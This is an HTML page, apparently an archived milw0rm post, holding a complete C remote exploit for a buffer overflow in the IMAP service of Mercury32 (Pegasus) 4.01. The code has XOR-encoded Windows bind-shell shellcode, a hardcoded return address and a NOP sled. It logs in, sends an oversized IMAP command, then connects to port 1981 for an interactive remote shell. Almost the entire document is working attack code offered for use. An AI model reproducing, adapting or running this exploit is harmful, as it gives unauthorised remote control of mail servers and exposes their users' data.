<html><head><title>Mercury Mail 4.01 (Pegasus) IMAP Buffer Overflow v2 (c code)</title></head><pre>/** Remote Mercury32 Imap exploit [14 types of attacks] WOW!
 ** By: JohnH@secnetops.com
 **
 ** Notes: Second public release and both of them are murcury32 ;) 
 **        Again someone posted some dos code :( why bother?
 **        If you spent the time to look, it uses the same buffer for all 14 types of attacks and the size does not 
 **        change. I did not check the asm but its prob using the same routine for all 14 commands.
 **
 ** Date: 12/01/04
 **/

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netinet/tcp.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/time.h&gt;

#define version         &quot;1.0&quot;
int usage(char *p);


char sc_bind[] =
    //decoder
    &quot;\xEB\x0F\x5B\x80\x33\x96\x43\x81\x3B\x45\x59\x34\x53\x75\xF4\x74&quot;
    &quot;\x05\xE8\xEC\xFF\xFF\xFF&quot;
    //sc_bind_1981 for 2k/xp/2003 v1.03.10.09 by ey4s
    //XOR with 0x96 (267 0x10B bytes)
    &quot;\x7E\xB2\x96\x96\x96\x22\xEB\x83\x0E\x5D\xD4\xE1\x2E\x4A\x4B\x8C&quot;
    &quot;\xA5\x7F\x2D\x55\x38\x50\xBD\x2B\xB8\x48\xC1\xE4\x32\xB2\x24\xA4&quot;
    &quot;\x96\x98\xCB\x5D\x48\xE2\xB4\xF5\x5E\xC9\xFC\xA6\xCD\xF2\x1D\x95&quot;
    &quot;\x1D\xD6\x9A\x1D\xE6\x8A\x3B\x1D\xFE\x9E\xFC\x92\xCF\x7E\x12\x96&quot;
    &quot;\x96\x96\x74\x6F\x23\x95\xBD\x77\xFE\xA5\xA4\x96\x96\xFE\xE1\xE5&quot;
    &quot;\xA4\xC9\xC2\x69\xC1\x6E\x03\xFC\x93\xCF\x7E\xF1\x96\x96\x96\x74&quot;
    &quot;\x6F\x1D\x61\xC7\xFE\x94\x96\x91\x2B\x1D\x7A\xC7\xC7\xC7\xC7\xFC&quot;
    &quot;\x97\xFC\x94\x69\xC0\x66\x05\xFC\x86\xC3\xC5\x69\xC0\x62\xC6\xC5&quot;
    &quot;\x69\xC0\x6E\x1D\x6A\xFC\x98\xCF\x3D\x74\x6B\xC6\xC6\xC5\x69\xC0&quot;
    &quot;\x6A\x3D\x3D\x3D\xF0\x51\xD2\xB2\xBA\x97\x97\x1D\x42\xFE\xF5\xFB&quot;
    &quot;\xF2\x96\x1D\x5A\xC5\xC6\xC1\xC4\xA5\x4D\xC5\xC5\xC5\xFC\x97\xC5&quot;
    &quot;\xC5\xC7\xC5\x69\xC0\x76\xFC\x69\x69\xA1\x69\xC0\x4A\x69\xC0\x7A&quot;
    &quot;\x69\xC0\x7A\x69\xC0\x7E\xC7\x1D\xE3\xAA\x1D\xE2\xB8\xEE\x95\x63&quot;
    &quot;\xC0\x1D\xE0\xB6\x95\x63\xA5\x5F\xDF\xD7\x3B\x95\x53\xA5\x4D\xA5&quot;
    &quot;\x44\x99\x28\x86\xAC\x40\xE2\x9E\x57\x5D\x8D\x95\x4C\xD6\x7D\x79&quot;
    &quot;\xAD\x89\xE3\x73\xC8\x1D\xC8\xB2\x95\x4B\xF0\x1D\x9A\xDD\x1D\xC8&quot;
    &quot;\x8A\x95\x4B\x1D\x92\x1D\x95\x53\x3D\xCF\x55&quot;
    //decoder end sign
    &quot;\x45\x59\x34\x53&quot;;

int             type;
int             iPort=143;
char    *ip=NULL;
char    username[256];
char    password[256];

int main(int argc, char **argv)
{
    int             c;


    if(argc &lt; 2)
    {
        usage(argv[0]);
        return 0;
    }


    while((c = getopt(argc, argv, &quot;u:P:h:p:t:&quot;)) != EOF) {
        switch(c) {

        case 'u':
            strncpy(username, optarg, sizeof (username) - 1);
            break;

        case 'P':
            strncpy(password, optarg, sizeof (password) - 1);
            break;

        case 'h':
            ip=optarg;
            break;
        case 'p':
            iPort=atoi(optarg);
            break;
        case 't':
	    type=atoi(optarg);
	    break;
	default:
            usage (argv[0]);
            return 0;
        }
    }


    if((!ip))
    {
        usage(argv[0]);
        printf(&quot;[-] Invalid parameter.\n&quot;);
        return 0;
    }

    SendExploit();
    return 0;
}

/* ripped from TESO code */
void shell (int sock)
{
    int     l;
    char    buf[512];
    fd_set  rfds;


    while (1) {
        FD_SET (0, &amp;rfds);
        FD_SET (sock, &amp;rfds);
        select (sock + 1, &amp;rfds, NULL, NULL, NULL);
        if (FD_ISSET (0, &amp;rfds)) {
            l = read (0, buf, sizeof (buf));
            if (l &lt;= 0) {
                printf(&quot;\n - Connection closed by local user\n&quot;);
                exit (EXIT_FAILURE);
            }
            write (sock, buf, l);
        }

        if (FD_ISSET (sock, &amp;rfds)) {
            l = read (sock, buf, sizeof (buf));
            if (l == 0) {
                printf (&quot;\n - Connection closed by remote host.\n&quot;);
                exit (EXIT_FAILURE);
            } else if (l &lt; 0) {
                printf (&quot;\n - Read failure\n&quot;);
                exit (EXIT_FAILURE);
            }
            write (1, buf, l);
        }
    }
}

int     SendExploit()
{
    struct hostent *he;
    struct in_addr in;
    struct sockaddr_in peer;
    int             iErr, s,s2;
    int x;
    char    buffer[9000];
    char    buffer2[9000];
    char    szRecvBuff[0x1000];
    char *ip2=NULL;

    printf( &quot;MERCURY32 Imap exploit\n&quot;);
    printf( &quot;By: JohnH@secnetops.com\n&quot;);
    printf(&quot;[+] Entering God Mode\n&quot;);

    // Login
    memset(buffer2,0x0,sizeof(buffer2));
    strcat(buffer2,&quot;a001 LOGIN &quot;);
    strcat(buffer2,username);
    strcat(buffer2,&quot; &quot;);
    strcat(buffer2,password);
    strcat(buffer2,&quot;\n&quot;);

    bzero  (buffer,sizeof(buffer));
    printf(&quot;[+] Using type: %d\n&quot;,type);
    if (type == 0)
          strcat(buffer,&quot;a001 EXAMINE &quot;);
    else if(type == 1)
	   strcat(buffer,&quot;a001 SUBSCRIBE &quot;);
    else if(type == 2)
	   strcat(buffer,&quot;a001 STATUS &quot;);
    else if(type == 3)
            strcat(buffer,&quot;a001 APPEND &quot;);
    else if(type == 4)
            strcat(buffer,&quot;a001 CHECK &quot;);
    else if(type == 5)
            strcat(buffer,&quot;a001 CLOSE &quot;);
    else if(type == 6)
            strcat(buffer,&quot;a001 EXPUNGE &quot;);
    else if(type == 7)
            strcat(buffer,&quot;a001 FETCH &quot;);
    else if(type == 8)
            strcat(buffer,&quot;a001 RENAME &quot;);
    else if(type == 9)
            strcat(buffer,&quot;a001 DELETE &quot;);
    else if(type == 10)
            strcat(buffer,&quot;a001 LIST &quot;);
    else if(type == 11)
            strcat(buffer,&quot;a001 SEARCH &quot;);
    else if(type == 12)
	    strcat(buffer,&quot;a001 CREATE &quot;);
    else if(type == 13)
            strcat(buffer,&quot;a001 UNSUBSCRIBE &quot;);
    else if(type == 14)
	    strcat(buffer,&quot;a001 SELECT &quot;);



    x = strlen(buffer);
    memset(buffer+x,0x41,260);
    x+=260;
    *(unsigned int *)&amp;buffer[x] = 0x01f9c8fa;
    x+=4;
    memset(buffer+x,0x90,100);
    x+=100;
    memcpy (buffer+x, sc_bind, strlen(sc_bind));
    x+=strlen(sc_bind);
    memcpy(buffer+x,&quot;\r\n&quot;,2);
    x+=2;


    if (!(he = gethostbyname(ip)))
    {
        herror(&quot;Resolving host&quot;);
        exit(EXIT_FAILURE);
    }
    in.s_addr = *((unsigned int *)he-&gt;h_addr);
    peer.sin_family = AF_INET;
    peer.sin_port = htons(iPort);
    peer.sin_addr.s_addr = inet_addr(ip);
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s &lt; 0)
    {
        perror(&quot;socket&quot;);
        return(0);
    }
    if (connect(s, (struct sockaddr *)&amp;peer, sizeof(struct sockaddr_in)) &lt; 0)

    {
        perror(&quot;connect&quot;);
        return(0);
    }
    printf(&quot;[+] connect to %s:%d success.\n&quot;, ip, iPort);
    sleep(3);

    memset(szRecvBuff, 0, sizeof(szRecvBuff));
    iErr = send(s, buffer2, strlen(buffer2),0);
    printf(&quot;[+] Sent: %d\n&quot;, iErr);

    iErr = send(s, buffer, x,0);

    printf(&quot;[+] Sent: %d\n&quot;, iErr);

    printf(&quot;[+] Wait for shell.\n&quot;);
    if (!(he = gethostbyname(ip)))
    {
        herror(&quot;Resolving host&quot;);
        exit(EXIT_FAILURE);
    }
    in.s_addr = *((unsigned int *)he-&gt;h_addr);
    ip2 = in.s_addr;

    sleep(5);
    peer.sin_family = AF_INET;
    peer.sin_port = htons(1981);
    peer.sin_addr.s_addr = ip2;
    s2 = socket(AF_INET, SOCK_STREAM, 0);
    if (s2 &lt; 0)
    {
        perror(&quot;socket&quot;);
        exit(EXIT_FAILURE);
    }

    if (connect(s2, (struct sockaddr *)&amp;peer, sizeof(struct sockaddr_in)) &lt; 0)
    {
        perror(&quot;connect&quot;);
        return(0);
    }
    printf (&quot;[+] We got a shell \n&quot;);

    shell(s2);


    return 0;

}

int usage(char *p)
{
    printf(&quot;MERCURY32 Imap Remote Exploit\n&quot;);
    printf(&quot;By: JohnH@secnetops.com\n&quot;);
    printf( &quot;Usage: %s &lt;-u username&gt; &lt;-p password&gt; &lt;-h host&gt; &lt;-p port&gt; &lt;-t type&gt;\n&quot;,p);
    printf(&quot;Possible types: Look in source code too lazy to type out 14 types\n&quot;);
    exit(0);
}

// milw0rm.com [2004-12-01]</pre></html>